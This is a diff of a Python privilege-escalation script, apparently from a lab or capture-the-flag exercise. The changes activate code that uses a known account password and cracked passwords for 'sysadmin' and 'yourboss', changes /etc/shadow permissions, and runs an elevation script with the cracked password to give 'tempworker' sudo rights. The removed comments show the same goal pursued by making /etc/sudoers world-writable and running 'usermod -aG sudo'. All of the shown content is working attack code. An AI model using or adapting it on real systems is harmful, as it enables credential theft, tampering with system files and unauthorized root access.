@@ -57,7 +57,7 @@ def exec_elevate_cmd_as_user(user, password, command):
         spawned.sendline(password)
         print(spawned.read().decode('utf-8'))
 
-'''
+
 # We already know tempuser's password
 temp_password = "correctbatteryhorsestaple99"
 
@@ -113,14 +113,11 @@ if sysadmin_cracked != sysadmin_cracked_backup:
 
 print(sysadmin_cracked)
 
+
 # Fix permissions
 exec_cmd_as_user('yourboss', yourboss_cracked, 'chmod u=rw,g=r,o= /etc/shadow')
-'''
+
 
 # Elevate tempworker
-# exec_cmd_as_user('yourboss', yourboss_cracked, 'chmod u=rw,g=rw,o=rw /etc/sudoers')
-# exec_elevate_cmd_as_user('yourboss', yourboss_cracked, 'su yourboss -c "echo money | sudo -S usermod -aG sudo tempworker"')
-# su %s -c "echo %s | sudo -S %s"
-# exec_cmd_as_user('yourboss', yourboss_cracked, 'chmod u=r,g=r,o= /etc/sudoers')
-
+elevate_process = subprocess.Popen(('./elevate_tempworker.sh ' + yourboss_cracked).split())
 
